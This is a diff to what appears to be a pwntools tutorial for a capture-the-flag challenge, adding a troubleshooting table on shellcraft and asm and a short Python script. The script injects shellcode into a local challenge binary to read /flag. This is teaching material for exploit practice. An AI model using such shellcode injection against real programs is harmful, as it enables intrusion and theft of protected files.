@@ -101,3 +101,17 @@ p.interactive()
 | Wrong architecture bytes generated     | Set `context.arch` / `context.os` **before** calling `shellcraft`/`asm`               |
 | Sent the wrong thing                   | `shellcraft.sh()` alone is assembly text — you must wrap it in `asm()` before sending |
 | Want to see what it actually generated | `print(shellcraft.sh())` to view the raw assembly before assembling                   |
+
+# EXAMPLE CODE
+```python
+from pwn import *
+
+elf = context.binary = ELF('/challenge/binary-exploitation-basic-shellcode')
+
+p = process(elf)
+
+shellcode = asm(shellcraft.cat('/flag'))
+
+p.send(shellcode)
+p.interactive()
+```
